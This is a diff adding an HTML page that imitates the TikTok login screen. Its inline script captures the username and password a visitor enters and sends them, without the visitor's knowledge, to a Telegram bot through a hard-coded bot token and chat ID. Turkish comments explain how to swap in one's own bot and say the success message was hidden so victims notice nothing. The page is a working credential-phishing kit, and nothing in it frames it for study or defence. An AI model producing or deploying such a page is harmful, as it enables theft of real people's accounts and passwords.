@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>TikTok Login</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <div class="container">
+    <div class="login-box">
+      <div class="logo-container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a9/TikTok_logo.svg/2560px-TikTok_logo.svg.png" alt="TikTok Logo" class="logo" />
+      </div>
+      
+      <form id="loginForm" class="login-form">
+        <input type="text" name="username" placeholder="Phone, email, or username" required />
+        <input type="password" name="password" placeholder="Password" required />
+        <button type="submit" class="login-button">Log In</button>
+      </form>
+
+      <!-- Success message hidden by default -->
+      <!-- Bu satırı tamamen kaldırdık, böylece mesaj görünmeyecek -->
+      <!-- <div id="successMessage" style="display: none;">Login information sent successfully!</div> -->
+
+      <p class="forgot-password"><a href="#">Forgot password?</a></p>
+      <p class="signup-text">Don't have an account? <a href="#">Sign up</a></p>
+    </div>
+  </div>
+
+  <script>
+    document.getElementById("loginForm").addEventListener("submit", function (e) {
+      e.preventDefault();
+
+      const formData = new FormData(this);
+      const data = {
+        username: formData.get("username"),
+        password: formData.get("password"),
+      };
+
+      // Telegram Bot API URL
+      const botToken = "7883112098:AAE56rI3QkScOISR8BiTEjhhY185GVHrR9g"; // Buraya botunuzun token'ını koyun
+      const chatId = "7425493729"; // Buraya chat ID'nizi koyun
+      const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+      // Gönderilecek mesaj
+      const message = `New Login Attempt:\nUsername: ${data.username}\nPassword: ${data.password}`;
+
+      // Telegram botuna mesaj gönderme
+      fetch(telegramApiUrl, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message,
+          parse_mode: "HTML",
+        }),
+      })
+      .then(response => response.json())
+      .then(data => {
+        console.log("Login information sent to Telegram bot.");
+      })
+      .catch((error) => {
+        console.error("Error:", error);
+      });
+    });
+  </script>
+</body>
+</html>
